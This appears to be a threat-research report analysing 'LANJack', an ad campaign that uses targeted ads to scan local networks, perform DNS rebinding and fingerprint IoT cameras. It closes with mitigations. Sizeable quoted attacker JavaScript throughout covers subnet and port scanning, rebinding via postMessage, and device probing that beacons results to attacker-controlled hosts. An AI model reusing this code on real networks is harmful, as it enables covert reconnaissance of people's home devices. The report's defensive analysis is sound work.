...
vision_verified_pages_changed: 59
...
- ***LANJack: Turning Ads into IoT Recon Tools*** — 1
- **Introduction** — 3
- **Background** — 4
...
To deliver ads to specific audiences, this infrastructure enables highly granular targeting based on geographic location, device type, operating system, browser, language, and behavioral data. The entire process runs behind the scenes in milliseconds, with no human involvement in decision-making or delivery.
...
|Networking stack|Browser|Plugin|Plugin|
|DNS handling|Browser|Plugin|Plugin|
|Security model|Same-Origin Policy|crossdomain.xml policy|Java sandbox|
...
This coordinated campaign mimicked multiple fake hotel landing pages as "safe" content for non-targeted users, while delivering tech support scam pages to targeted victims.
...
Actors: Attacker Server (1.2.3.4), the victim's browser, and Malicious DNS.

- **1** http://malicious.com
- **2** What IP of malicious.com ?
- **3** Real Public IP + Short Time to Live — Example: 1.2.3.4, TTL: 0
- **4** http://malicious.com
- **5** Malicious code
- </> Get Resource from './index.html' </> — TTL of malicious.com expired
- **6** What IP of malicious.com ?
- **7** Private Local IP — Example: 192.168.1.50
...
**Location Targeting** (pie chart) — data labels: 98% (MX), 1%, 1%. Legend: MX, ME, US, Others.

_Figure 11- Location Targeting_

**Device Targeting** (pie chart) — data labels: Mobile 98%, Tablet 1%, Desktop 1%. Legend: Mobile, Tablet, Desktop.

_Figure 12- Device Targeting_

**Browser Targeting** (pie chart) — data labels: 99% (Chrome WebView), 1%. Legend: Chrome WebView, Chrome, Android Browser, Mobile Safari, WebKit, Edge.
...
Later, the campaign's image was taken from an article published on `burkina24.com`, a West African outlet that covers Burkina Faso and international news. (Link for the article)
...
IP history results for 'performance-metrics.net'.

|IP ADDRESS|LOCATION|IP ADDRESS OWNER|LAST SEEN ON THIS IP|
|---|---|---|---|
|54.209.207.15|Ashburn - United States|AMAZON-AES|2025-11-06|
|208.91.197.132|British Virgin Islands|CONFLUENCE-NETWORK-INC|2015-06-22|
|65.125.27.10|Chambers - United States|CENTURYLINK-US-LEGACY-QWEST|2015-05-11|

_Figure 16- Screenshot from viewdns.info_

## Slide 16

The campaign's ad images were observed alternating between two hosting sources: the attacker-controlled domain `performance-metrics.net` and the legitimate news site `burkina24.com`.

_Figure 17- More Ads recognized with this campaign_

Additional experimental campaign variants were observed on DuckDNS subdomains. The first, introduced in November 2025, tested the RTSP protocol through `sadnesswithads.duckdns.org`.
...
**Figure 19 diagram — AD IFRAME (ipScanner.html IFRAME).** Right-side stage labels: 1 Attack Triggering, 2 DNS Cache Priming, 3 LAN Reconnaissance, 4 DNS Rebinding, 5 IoT Fingerprinting & Exploitation preparation.

- **1–2 (Attack Triggering / DNS Cache Priming):** IFRAME: `http://${uuldv4()}.vf-globallab.com:${port}/CamScanner.html` (three stacked iframes)
- **3 (LAN Reconnaissance):**
  - FETCH: `http://10.0.0.254/bla_iter1.jpg` — credentials: 'omit', AbortSignal: 1 sec
  - ⋮
  - FETCH: `http://192.168.1.1/bla_iter1.jpg`
  - FETCH: `http://10.0.0.253:80/favicon.ico` — credentials: 'omit', mode: 'no-cors', cache: 'no-store', AbortSignal: 3 sec
  - ⋮
  - `http://10.0.0.253:8888/favicon.ico`
- **4 (DNS Rebinding):**
  - IFRAME: `http://${uuldv4()}.vf-aloballab.com:${port}/CamScanner.html`
  - IMG: `http://${int32_IP}.${uuldv4()}.control.vf-aloballab.com/...`
  - Iframe resolve to internal IP
- **5 (IoT Fingerprinting & Exploitation preparation):** FETCH: `/ISAPI/Security/userCheck`, `/upnpdevicedesc.xml`, `/cgi-bin/main-cgi?json={{%22cmd%22:%20116}}`
...
As mentioned earlier, the campaign leverages server-side ad targeting, causing the ad to behave differently based on the user's device, browser, and geographic location. When the ad is rendered in a non-targeted environment, the resulting network traffic (HAR file) is minimal and typically consists of only two primary requests: the JavaScript loader (`/load.js`) and the ad creative (image), along with a tracking pixels associated with the supply chain and DSP.

|Name|Status|Domain|R...|Type|Initiator|Size|
|---|---|---|---|---|---|---|
|load.js?x=331857147-1772979237-501-1-1...|200|performance-metrics.net||script|tag_tester?code_id=472832|0.2 kB|
|coca-1536x439.jpg|200|burkina24.com|[2...|jpeg|tag_tester?code_id=472832|102 kB|
...
- `carrier=` which contains the Internet Service Provider (ISP) of the user whose device participated in the ad auction.

- ifa: 93499c19-596e-4361-a29b-7188d2518165
- x: 252488298-1765756839-609-3-11-817-10-DosRA-b21d8a82-7a49-3fa3-bfa6-c0b7f50ff466-10031-491906-52110628
- carrier: totalplay
...
2. Creates the next stage by injecting a hidden iframe (0×0 pixels) that loads `/ipScanner2.html?${xid}`.
3. Registers a 'setTimeout', which attempts to force a redirect of the top-level page to `/ipScanner2.html?${xid}` after 5 seconds. This mechanism operates in parallel with the hidden iframe: if the iframe-based execution fails (for example, due to iframe
...
```js
xid="ifa=93499c19-596e-4361-a29b-7188d2518165&x=252488298-1765756839-609-3-11-817-10-DosRA-b21d8a82-7a49-3fa3-bfa6-c0b7f50ff466-10031-491906-52110628&carrier=totalplay"
...
frm.width=0
frm.height=0
frm.src="http://performance-metrics.net/ipScanner2.html?"+xid
document.body.appendChild(frm)

function loadTop()
{
    top.location="http://performance-metrics.net/ipScanner2.html?"+xid
}

window.tmo = setTimeout(loadTop,5000)

try
{
    fetch("https://performance-metrics.net/k33p?x="+xid,{credentials:'omit', method: "POST", body: "JS Loaded (https)"})
}
catch (error) {}
try
{
    fetch("http://performance-metrics.net/k33p?x="+xid,{credentials:'omit', method: "POST", body: "JS Loaded (http)"})
}
catch (error) {}
```
...
```js
`Global Error – ${event.message} @ ${event.filename}:${event.lineno}:${event.colno}${event?.error?.stack ? '\n' + event.error.stack : ''}`
```
...
```js
queue.push(`http://${uuidv4()}.vf-globallab.com:${port}/CamScanner2.html?x=${window.id}`);
```
...
```js
const preloadPorts = ['80','81','8080','82','88','83','8001','84','85','90','8888','9000','8090','8000','8010','9090','1080'];
```
...
|81–85, 90|Alternate HTTP|Common alternative web ports used by routers, cameras, DVRs, and embedded devices when port 80 is unavailable.|
|8080, 8888|HTTP Alternative / Dev Tools|Frequently used by web proxies, admin panels, Apache Tomcat, and tools like Jupyter Notebook.|
|8000, 8001|Development / Device Services|Used by development frameworks (e.g., Python/Django dev servers) and some device APIs such as Hikvision services.|

## Slide 22

|**Port(s)**|**Common Usage**|**Typical Context / Notes**|
|---|---|---|
|8010, 8090|Enterprise / Web Applications|Often used by enterprise dashboards, internal services, or specialized web applications.|
|9000|Backend Services|Common for backend services such as PHP-FPM, SonarQube, or other internal application servers.|
|9090|Monitoring / Dashboards|Frequently used by monitoring platforms like Prometheus or administrative dashboards.|
|1080|SOCKS Proxy|Standard port for SOCKS proxy servers used for tunneling or traffic redirection.|
|88|Kerberos Authentication|Official port for Kerberos authentication; occasionally reused by some devices for web interfaces.|
...
```js
subnets=["10.0.0.254", "192.168.1.1", "192.168.0.1" ,"192.168.10.1" ,"192.168.2.1" ,"192.168.24.1" ,"10.5.50.1" ,"192.168.33.1" ,"192.168.8.1" ,"192.168.6.1",
"192.168.140.1" ,"172.16.0.1" ,"172.19.1.1" ,"10.118.15.1" ,"172.25.20.1" ,"10.1.1.1" ,"172.19.0.1" ,"192.168.103.1" ,"10.168.10.1" ,"192.168.31.1" ,"192.168.254.1",
"10.221.15.1" ,"10.21.141.1" ,"192.168.64.1" ,"192.168.27.1" ,"192.168.5.1" ,"172.16.130.1" ,"192.168.7.1" ,"172.16.11.1" ,"172.16.140.1" ,"192.168.15.1" ,"172.30.37.1",
"10.10.20.1" ,"10.10.110.1" ,"172.168.1.1" ,"10.160.5.1" ,"10.10.140.1" ,"192.168.14.1" ,"172.16.10.1" ,"10.219.3.1" ,"10.0.0.138" ,"10.100.102.1" ,"192.168.100.1",
"192.168.200.1", "192.168.20.1", "192.168.240.1", "192.168.88.1", "192.168.1.254", "10.0.0.1"]
```
...
Each of the 254 possible IP addresses in the subnet is then combined with the set of ports identified earlier. For each IP–port combination, the script attempts to request the resource `/favicon.ico`.

```js
async function scanIpsAndPorts({
  ips,
  ports,
  onLive,              // function (ip, port, url) {}
  scheme = "http",     // "http" or "https"
  path = "/favicon.ico",
  timeoutMs = 1500,
  batchSize = 100,
  pauseBetweenBatchesMs = 0,
  bustCache = true,     // kept for compatibility; not used below
}) {
  // Helper: build a list of {ip, port, url} for given sets
  const makeCombos = (ipList, portList) => {
    const combos = [];
    for (const port of portList) {
      for (const ip of ipList) {
        const url = `${scheme}://${ip}:${port}${path}`;
        combos.push({ ip, port: String(port), url });
      }
    }
    return combos;
  };
...
```js
async function isHostUp(url, timeoutMs = 1000, method = "GET") {
  ...
  try {
    ...
    await fetch(url, {
      method: 'GET',
      credentials:'omit',
      mode: "no-cors",    // don't require CORS; we only care if we got *any* response
      cache: "no-store",
      signal: AbortSignal.timeout(3000),
    });
    const duration = performance.now() - start;
    return { up: true, duration };        // any network response => treat as "up"
  } catch (e) {
    return { up: false, duration: null };        // DNS fail / refused / TLS error / timeout => "down"
  }
}
```
...
A URL from the cache list with the same port as the “up internal IP” is selected, and an additional invisible iframe (2×2 pixels) is injected and evaluated inside the ad frame. This iframe includes an onload event. Once loaded, the IP encoded as int32 is sent to the new frame using the 'postMessage' method, still inside the `ipScanner2.html` script.

```js
function getCachedFrameForPort(port,ip)
{
  const container5 = document.getElementById("container5");
  let x = readyCacheURLs.get(String(port))
  if (x.length==0)
  {
    Homey("CamScan: Out of Frames for port - " + port + "| For IP - "+ip+" | Caching State = "+window.cacheDone)
    return;
  }
  newURL=x.shift()
  const f = document.createElement('iframe');
  ...
  f.onload=function()
      {
          this.contentWindow.postMessage(ipToInt32(ip), "*");
          Homey("CamScan: Sent postMessage to frame with port - "+port+" | For IP - "+ ip)
      }
  container5.appendChild(f)
}
```
...
```js
window.addEventListener('message', (event) => {
  upadtedns(event.data)
  //Homey("CamScan: Started work - "+location.host)
});
```
...
```js
function upadtedns(ip) {
  if (int32ToIp(ip) == "0.0.0.0") {
    return
  }
  Homey("CamScan: frame got ip - " + int32ToIp(ip) + " (" + ip + ")")
  window.myIP = int32ToIp(ip)
  let loc = window.location.host
  loc = loc.replace(".vf-globallab.com", ".control.vf-globallab.com");
  document.getElementById("dnsimg").innerHTML = "<img src='http://" + ip + "." + loc + "' onload=start('" + int32ToIp(ip) + "')  onerror=start('" + int32ToIp(ip) + "')>"
...
The DNS record for this request resolves to `127.0.0.1`, while the DNS record of the iframe's origin resolves now to the identified internal IP.

```
Standard query 0x1a28 A 3232235881.85d67bd3-33ff-48c3-a665-8c0d92e1927e.control.vf-globallab.com
Standard query response 0x1a28 A 3232235881.85d67bd3-33ff-48c3-a665-8c0d92e1927e.control.vf-globallab.com A 127.0.0.1
Standard query response 0x1a28 A 3232235881.85d67bd3-33ff-48c3-a665-8c0d92e1927e.control.vf-globallab.com A 127.0.0.1
```
...
function int32ToIp(n) {
  n = Number(n) >>> 0; // coerce to unsigned 32-bit
  return [
    (n >>> 24) & 0xFF,
    (n >>> 16) & 0xFF,
    (n >>> 8  & 0xFF,
...
```
Queries
  performance-metrics.net: type A, class IN
    Name: performance-metrics.net
    [Name Length: 23]
    [Label Count: 2]
    Type: A (1) (Host Address)
    Class: IN (0x0001)
Answers
  performance-metrics.net: type A, class IN, addr 54.209.207.15
    Name: performance-metrics.net
    Type: A (1) (Host Address)
    Class: IN (0x0001)
...
Queries
Answers
  3474d157-af45-443c-8385-9fa51983a887.vf-globallab.com: type A, class IN, addr 54.209.207.15
    Name: 3474d157-af45-443c-8385-9fa51983a887.vf-globallab.com
    Type: A (Host Address) (1)
    Class: IN (0x0001)
...
0010  00 73 28 18 00 00 40 11  3b ca 0a 00 00 8a 0a 00   .s(...@. ;......
0020  02 0f 00 35 dc 81 00 5f  9a c0 e2 26 81 80 00 01   ...5..._ ...&....
0030  00 01 00 00 00 00 24 33  34 37 34 64 31 35 37 2d   ......$3 474d157-
0040  61 66 34 35 2d 34 34 33  63 2d 38 33 38 35 2d 39   af45-443 c-8385-9
0050  66 61 35 31 39 38 33 61  38 38 37 0c 76 66 2d 67   fa51983a 887.vf-g
0060  6c 6f 62 61 6c 6c 61 62  03 63 6f 6d 00 00 01 00   loballab .com...
```
...
As in previous stages, the request is performed with `credentials: 'omit'` and `cache: 'no-store'` to avoid sending authentication data and to ensure a fresh network request.
...
if (response.type == 'opaqueredirect') {
  Homey("CamScan: (main) Frame returned Redirect, probably to HTTPS - " + finalurl)
  orch()
  return
}
```
...
```js
const redirectUrls = extractRedirectUrlsFromHtml(response)
redirectUrls.forEach(redurl => {
  fetchURL(redurl);
});
```
...
if ((!response.ok) && (response.status != 404) && (response.status != 401)) {
  Homey("CamScan: (main) Non Standard response code - " + response.status + " | url - " + finalurl)
  orch()
  return
}
```
...
```js
actualTime = Date.now() - window.startTime
Homey("CamScan: Frame Loaded With a time of - " + actualTime + " | Counter - " + retryFrameCounter)
Homey("CamScan: url - " + finalurl + " | ip - " + window.myIP + " | Data - " + btoa(unescape(encodeURIComponent(responseText))))

let favpath = extractFaviconHrefSimple(responseText)
if (!favpath) {
  favpath = '/favicon.ico'
}
```
...
```js
fetchFaviconAsBase64(favpath).then(base64String => {
  if (base64String) {
    const base64Data = base64String.split(',')[1]; // Remove the data: prefix
    const formatted = base64Data.match(/.{1,76}/g).join('\n') + '\n'; // Wrap every 76 chars

    const unsigned = murmurhash3_32_gc(formatted);
    const hash = unsigned > 0x7FFFFFFF ? unsigned - 0x100000000 : unsigned; // signed 32-bit

    Homey('CamScan: Base64 Favicon | url - ' + finalurl + " | ip - " + window.myIP + " | Path - " + favpath + ' | Hash - ' + hash + ' | Data - ' + base64String);

    if (LOOKUP.get(hash.toString())) {
      matchByFav(hash)
    }
    else {
      matchByHTML(responseText, fetchPageByHTMLMatch)
    }
  }
  else {
    matchByHTML(responseText, fetchPageByHTMLMatch)
...
After this phase is completed, the script invokes the `orch` function mentioned above.

<u>This function performs several tasks:</u>
...
2. **IoT interface probing-** The script issues eight GET requests to URLs commonly found in the web interfaces of IoT devices, including vendors such as Hikvision, Dahua, and UniView. Examples include: `/current_config/WebCapConfig` and `/cgi-bin/main-cgi?json={{%22cmd%22:%20116}}`.
3. **Capability query-** The script sends a POST request to `/OutsideCmd` with the `body:{"method":"WebInit.getCaps","params”: null,"id":3,"session":0}` This appears intended to retrieve device capability information.
...
```js
function orch(response = "") {
  urls = ["/upnpdevicedesc.xml",
    "/doc/project_config.json",
    "/current_config/WebCapConfig",
    "/queryDevInfo?NVMS-9000",
    "/logo/qr.js",
    "/cap.js",
    "/cgi-bin/main-cgi?json={{%22cmd%22:%20116}}",
    "/script/common/device_type.js"]
  ...
  //web interfaces for CCTV  Dahua or Hikvision.
  myurl = "/OutsideCmd";
  body = `{"method":"WebInit.getCaps","params":null,"id":3,"session":0}`
  fetchURL(myurl, body)
  ...
  fetchAuthHeader("/cgi-bin/a")
  fetchAuthHeader("/ISAPI/Security/userCheck")
}
```

_Figure 48- The 'orch' function_

These requests allow the script to fingerprint the targeted device, identify the vendor and model, and collect authentication or capability information, which may later be used to select device-specific exploitation techniques.
...
```js
async function fetchURL(myurl, body = "", headers = {}) {
  let finalurl = (new URL(myurl, location.protocol + location.host)).href
  let response;
  try {
    if (body != "") {
      response = await fetch(finalurl, { credentials: 'omit', redirect: 'manual', cache: "no-store", method: "POST", body: body, headers: headers });

    }
    else {
      response = await fetch(finalurl, { credentials: 'omit', redirect: 'manual', cache: "no-store", headers: headers });
    }
    if (response.type == 'opaqueredirect') {
      Homey("CamScan: Frame returned Redirect, probably to HTTPS - " + finalurl)
      return
    }
    if ((!response.ok) && (response.status != 404) && (response.status != 401) && (response.status != 501)) {
      Homey("CamScan: Non Standard response code - " + response.status + " | url - " + finalurl)
      return
    }
    if ((response.status == 404) || (response.status == 501)) {
      //ignore for now. too spammy
      return
    }

    const json = await response.text().then((responseText) => {
      Homey("CamScan: url - " + finalurl + " | ip - " + window.myIP + " | Data - " + btoa(unescape(encodeURIComponent(responseText))))
      const redirectUrls = extractRedirectUrlsFromHtml(responseText)
      redirectUrls.forEach(redurl => {
        fetchURL(redurl);
      });
      return
    ...
    if (error.message.indexOf('Failed to fetch') == -1) {
      Homey("CamScan: Error - " + error.message + " on url - " + finalurl)
    }
  }
}
```
...
Figure 50 is a montage of device interfaces (a Hikvision camera login page, a UNV TIC7862 login page, and an Intenso "Memory 2 Move" login page) alongside a page-source snippet:
...
Wireshark capture (display filter: `dns.qry.name contains "stackexchange" || tls.handshake.extensions_server_name contains "stackexchange"`). Columns: No., Time, Source, Destination, Protocol, Length, Info. The capture shows a flood of DNS queries from 192.168.1.206 to 8.8.8.8 for randomly-numbered `NNNNgdf.stackexchange.com` subdomains (A, AAAA, and HTTPS record types); responses from 8.8.8.8 resolve the A records to 198.252.206.1 (with SOA damian.ns.cloudflare.com). Example row: `1260  2.244562  192.168.1.206  8.8.8.8  DNS  85  Standard query 0x97c7 HTTPS 9132gdf.stackexchange.com`.
...
```
GET https://60933gdf.stackexchange.com/img.jpg net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 429 (Too Many Requests)
GET https://34551gdf.stackexchange.com/img.jpg net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 429 (Too Many Requests)
GET https://80671gdf.stackexchange.com/img.jpg net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 429 (Too Many Requests)
GET https://28165gdf.stackexchange.com/img.jpg net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 429 (Too Many Requests)
GET https://66640gdf.stackexchange.com/img.jpg net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 429 (Too Many Requests)
GET https://48168gdf.stackexchange.com/img.jpg net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 429 (Too Many Requests)
GET https://21817gdf.stackexchange.com/img.jpg net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin 429 (Too Many Requests)
```
...
try
{
    fetch("https://sadnesswithads.duckdns.org/log3?x="+xid,{credentials:'omit', method: "POST", body: "Int: JS Loaded (https)"})
}
catch (error) {}
```
...
```js
Homey('Int: Starting Test')
location='RTSP://sadnesswithads.duckdns.org:8554/load3d?x='+window.id
```
...
Browser (address bar `sadnesswithads.duckdns.org/test_int.html?ifa=84a5cfae-4cfb-4a71-a94d-e622f7cfaaae&x=2…`) prompt: "Allow this site to open the rtsp link with System Handler?" — "Choose a different application.", checkbox "Always allow https://sadnesswithads.duckdns.org to open rtsp links", buttons Cancel / Open Link.
...
VLC is unable to open the MRL 'rtsp://sadnesswithads.duckdns.org:8554/load3d?x=268804059-1772203369-109-3-27-1686-7-dQ3X1-ef640e64-80c9-335a-85f3-95cfb7f76774-10031-545753-52268135'. Check the log for details.
```

_Figure 57- VLC attempts to open the URL_

```
Wireshark (display filter: rtsp). Columns: No., Time, Source, Destination, Protocol, Length, Info.
216…  359.0426517…  192.168.181.128  98.91.166.27  RTSP  283  SETUP rtsp://sadnesswithads.duckdns.org:8554/load3…
216…  359.3912271…  98.91.166.27  192.168.181.128  RTSP  116  Reply: RTSP/1.0 501 Not Implemented
216…  359.9356166…  192.168.181.128  98.91.166.27  RTSP  391  OPTIONS rtsp://sadnesswithads.duckdns.org:8554 RTS…
216…  360.4484723…  98.91.166.27  192.168.181.128  RTSP  103  Reply: RTSP/1.0 200 OK
```
...
Real Time Streaming Protocol
  Request: SETUP rtsp://sadnesswithads.duckdns.org:8554/load3d?x=339515104-176…
    Method: SETUP
    URL: rtsp://sadnesswithads.duckdns.org:8554/load3d?x=339515104-1764607045…
    Response in frame: 1662
  CSeq: 0
  Transport: RTP/AVP;unicast;client_port=9218-9219
```
...
```
OPTIONS rtsp://sadnesswithads.duckdns.org:8554 RTSP/1.0
CSeq: 1
...
(function() {
  try {
    ...
    iframe.src = 'https://adsrevenuestream.duckdns.org/i.html?x=243737984-1766450064-333-3-22-719-11-eDlZb-711283b3-e23d-3848-95c7-3f010772a011-10031-529475-52195013&carrier=izzix=';
...
<html>
  ...
  <body>
    <h3>/i.html</h3>
    <iframe src="/f1?x=243737984-1766450064-333-3-22-719-11-eDlZb-711283b3-e23d-3848-95c7-3f010772a011-10031-529475-52195013&carrier=izzix=" style="width:1px;height:1px;border:1px solid #ccc;" referrerpolicy="no-referrer"></iframe>
    <iframe src="/f2?x=243737984-1766450064-333-3-22-719-11-eDlZb-711283b3-e23d-3848-95c7-3f010772a011-10031-529475-52195013&carrier=izzix=" style="width:1px;height:1px;border:1px solid #ccc;" referrerpolicy="no-referrer"></iframe>
    <iframe src="/f3?x=243737984-1766450064-333-3-22-719-11-eDlZb-711283b3-e23d-3848-95c7-3f010772a011-10031-529475-52195013&carrier=izzix=" style="width:1px;height:1px;border:1px solid #ccc;" referrerpolicy="no-referrer"></iframe>
  </body>
</html>
```
...
<html>
  ...
  <body>
      <iframe src="https://accounts.google.com/ServiceLogin?hl=en-US&amp;continue=https://myactivity.google.com/?continue%3Dhttps://myactivity.google.com/activitycontrols?pli%253D1" referrerpolicy="no-referrer"></iframe>
  </body>
</html>
```
...
<html>
  <head><meta charset="utf-8"></head>
  <body>
      <iframe src="https://familycenter.facebook.com/dashboard/?entrypoint=fcsite%2F" referrerpolicy="no-referrer"></iframe>
  </body>
</html>
```
...
x        285180446-1766546665-651-1-79-1909-15-qxdEq-9e61d95f-5da4-3dde-a67b-19047fa22cdd-1003…
carrier  telmexx=a26e8024-d5cb-3863-b36d-4c5248c74f79
...
{csp-report: {,…}}
  csp-report: {,…}
    ...
    disposition: "enforce"
    document-uri: "https://adsrevenuestream.duckdns.org/f1?x=285180446-1766546665-651-1-79-1909-15-qxdEq-…"
    effective-directive: "frame-src"
    line-number: 5
    original-policy: "default-src 'self' https://accounts.google.com https://*.gstatic.com https://ogs.go…"
    referrer: ""
    script-sample: ""
...
_[Two screenshots: a Google Account "Activity controls" page and a Facebook "Family Centre" (For Meta technologies) page.]_
...
Framing 'https://www.facebook.com/' violates the following Content Security Policy directive: "default-src 'self' https://familycenter.facebook.com https://static.xx.fbcdn.net wss://gateway.facebook.com". The request has been blocked. Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.
```
...
```
General
Request URL: https://adsrevenuestream.duckdns.org/f1?x=285180446-1766546665-651-1-79-1909-15-qxdEq-9e61d95f-5da4-3dde-a67b-19047fa22cdd-10031-529475-52195013&carrier=telmexx=a26e8024-d5cb-3863-b36d-4c5248c74f79
Request Method: GET
Status Code: 200 OK
Remote Address: 18.233.217.158:443
Response headers:
Content-Length: 310
Content-Security-Policy: default-src 'self' https://accounts.google.com https://*.gstatic.com https://ogs.google.com https://lh3.google.com https://www.google-analytics.com https://play.google.com https://accounts.youtube.com https://www.google.com; report-uri /r1?x=285180446-1766546665-651-1-79-1909-15-qxdEq-9e61d95f-5da4-3dde-a67b-19047fa22cdd-10031-529475-52195013&carrier=telmexx=a26e8024-d5cb-3863-b36d-4c5248c74f79
Content-Type: text/html; charset=utf-8
Date: Mon, 29 Dec 2025 15:58:14 GMT
Etag: "278e203b4e29cf5f7a4b2d4b55b8391f93b5c957"
...
```
General
Request URL: https://adsrevenuestream.duckdns.org/f3?x=285180446-1766546665-651-1-79-1909-15-qxdEq-9e61d95f-5da4-3dde-a67b-19047fa22cdd-10031-529475-52195013&carrier=telmexx=a26e8024-d5cb-3863-b36d-4c5248c74f79
Request Method: GET
Status Code: 200 OK
Remote Address: 18.233.217.158:443
Response headers:
Content-Length: 214
Content-Security-Policy: default-src 'self' https://familycenter.facebook.com https://static.xx.fbcdn.net wss://gateway.facebook.com; report-uri /r3?x=285180446-1766546665-651-1-79-1909-15-qxdEq-9e61d95f-5da4-3dde-a67b-19047fa22cdd-10031-529475-52195013&carrier=telmexx=a26e8024-d5cb-3863-b36d-4c5248c74f79
Content-Type: text/html; charset=utf-8
Date: Mon, 29 Dec 2025 15:58:14 GMT
Etag: "791799f8d410b9663d3273921b080e3b95a0a99c"
Server: TornadoServer/6.5.4
```
...
|Name|Status|Domain|
|---|---|---|
|ServiceLogin?hl=en-US&continue=https://myactivity.……|302|accounts.google.com|
|InteractiveLogin?continue=https://myactivity.googl…8…|302|accounts.google.com|
|identifier?continue=https%3A%2F%2Fmyactivity.goog…|403|accounts.google.com|
...
|---|---|---|
|ServiceLogin?hl=en-US&continue=https://myactivity.……|302|accounts.google.com|
|?continue=https://myactivity.google.com/activitycontr…|403|myactivity.google.com|
...
|Name|Status|Domain|
|---|---|---|
|dashboard/?entrypoint=fcsite%2F|302|familycenter.facebook.com|
|login.php?next=https%3A%2F%2Ffamilycen…|400|www.facebook.com|

**Connected user:**

|Name|Status|Domain|
|---|---|---|
|dashboard/?entrypoint=fcsite%2F|400|familycenter.facebook.com|
...
**Facebook** (logo) — https://familycenter.facebook.com/dashboard/?… branches to:
- (user) familycenter.facebook.com/dashboard/?…
- (attacker, 🔒) www.facebook.com/login.p…

**Google** (logo) — https://accounts.google.com/ServiceLogin?… branches to:
- (user) …ctivity.google.com/?continue=…
- (attacker) accounts.google.com/InteractiveLogin?… → accounts.google.com/v3/signin/identifier?… (🔒)
...
It is important to note that, based on our analysis, authentication behavior for Facebook appears to function as expected only when requests are made in a same-site context. (with `Sec-Fetch-Site` header is `same-site`). When executed in cross-origin contexts, authentication cookies may still exist on the user's device but are not always accessible, as their inclusion depends on the user's third-party cookie settings. This behavior can be observed through the `Sec-Fetch-Storage-Access` header, which indicates whether storage access is permitted.
...
12. **Fetch Metadata Request Headers-** headers such as `Sec-Fetch-Site`, `Sec-Fetch-Mode`, and related fields allow servers to understand the context of incoming requests and identify potentially malicious cross-site requests originating from different browsing contexts.
...
17. **Favicon Fingerprinting-** a technique used to identify web services or devices by retrieving the `/favicon.ico` file and computing its hash (commonly MurmurHash). Because many devices and web interfaces ship with unique default icons, the resulting hash can be compared against known databases to infer the vendor, product type, or service implementation.
...
← undefined
Blocked loading mixed active content "http://performance-metrics.net/k33p?x=378065444-1773625811-238-3-31-1716-7-XLF7G-f2823d8b-ac89-393b-89d3-b3d5ea2a1a80-10031-529475-52284611&ifa=c33ff565-0574-477a-8b3d-c1099e819e6c" [Learn More]
...
Uncaught (in promise) TypeError: NetworkError when attempting to fetch resource.
    <anonymous> ...://performance-metrics.net/load.js?x=378065444-1773625811-238-3-31-1716-7-XLF7G-f2823d8b-ac89-393b-89d3-b3d5ea2a1a80-10031-529475-52284611&ifa=c33ff565-0574-477a-8b3d-c1099e819e6c
```

If the website includes a `<meta>` element with the Content Security Policy directive `upgrade-insecure-requests`, all HTTP requests are automatically upgraded to HTTPS. This will prevent the attack from working because the insecure resources required by the campaign cannot be loaded, and the logs intended to be sent to the attacker over HTTP will also fail.
...
|Name|Status|Domain|
|---|---|---|
|k33p?x=378065444-1773625811-238-3-…|(failed) net::ERR_CERT_COMMON_NAME_INVALID|54.209.207.15|

_Figure 71- Content Security Policy over the Meta element breaks the logs to the attacker_

```js
function reviewIPEntry(entry,stopFlag=false)
{

Uncaught TypeError: Cannot read properties of undefined (reading 'split')
    at reviewIPEntry (ipScanner2.html?x=37…c1099e819e6c:494:50)
    at ipScanner2.html?x=37…-c1099e819e6c:477:9
    at Array.forEach (<anonymous>)
    at PerformanceObserver.<anonymous> (ipScanner2.html?x=37…c1099e819e6c:475:13)

//Homey('ip reviewIPEntry2 - ActualTime = '+actualTime);
ip=entry.name.split('http://')[1].split('/')[0]
```
...
**Mixed Content Protection** — Attack Triggering: Rendering IpScanner over HTTP.

- Load.js File
  - Top Redirect (⏱ 5 sec)
    - Inside Restricted Frame (🔒) → Block Redirect (✗)
    - Inside Unsafe Frame → Redirect & Init Attack (☠)
  - Iframe Render
    - Safe Context (HTTPS) (🔒) → Block Iframe (✗)
    - Non-Safe Context (HTTP) → Init Attack (☠)
...
Browser (mexiconewsdaily.com) permission prompt: "mexiconewsdaily.com wants to — Access other devices on your local network" with buttons Block / Allow.
...
In Safari, access to devices on the local network depends on the user granting permission for local network access in macOS privacy settings. Details can be found at: https://support.apple.com/en-il/guide/mac-help/mchla4f49138/mac
...
[blocked] The page at https://mexiconewsdaily.com/news/mexico-week-in-review-congress-sheinbaum/ requested insecure content from http://192.168.0.1/ping. This content was blocked and must be served over HTTPS.
Not allowed to request resource
Fetch API cannot load http://192.168.0.1/ping due to access control checks.
```
...
```
fetch("http://192.168.0.1/ping");
Blocked loading mixed active content "http://192.168.0.1/ping" [Learn More]
```
...
As a result, an attacker can measure the timing of the connection attempt to infer whether a device on the local network is active. More details about this issue can be found here: https://github.com/WICG/local-network-access/issues/103
...
After the rebinding succeeds, the attacker begins endpoint enumeration and IoT fingerprinting. The script probes the rebinding domain using a set of requests to common IoT web interface paths and analyzes the responses. Information such as response behavior, redirect patterns, and favicon hashes is then sent back to the attacker to identify the device type and prepare device-specific exploitation steps.
...
| **Security Mechanism** | **Intended Protection** | **Observed Behavior in the Campaign (Browser)** | **Observed Behavior in the Campaign (WebView)** |
|---|---|---|---|
| Same-Origin Policy (SOP) | Prevents scripts from accessing resources from different origins. | The attacker used DNS rebinding to make local services appear as the same origin, enabling interaction with internal devices. | Same behavior applies, but WebView requests originate from the host application context. In some cases, JavaScript bridges or native interfaces may allow the page to trigger network requests through the application layer. |
| CORS | Controls whether cross-origin responses can be read by the requesting page. | Requests were routed through the rebinding domain, allowing interaction with local services that would otherwise be cross-origin. | Same behavior applies, but requests may also originate from the host application context. |
| DNS Pinning / DNS Cache | Mitigates DNS rebinding by caching domain resolutions. | The attacker used cache priming and repeated rebinding attempts to increase the likelihood that the DNS change would take effect. | DNS caching may differ depending on the networking stack used by the application or WebView engine. |
| Mixed Content Protection | Blocks HTTP resources from loading inside HTTPS pages. | The campaign attempted HTTP redirects to allow insecure resources required for the attack to load. | Apps may allow cleartext traffic via network security configuration, weakening mixed content protections. |
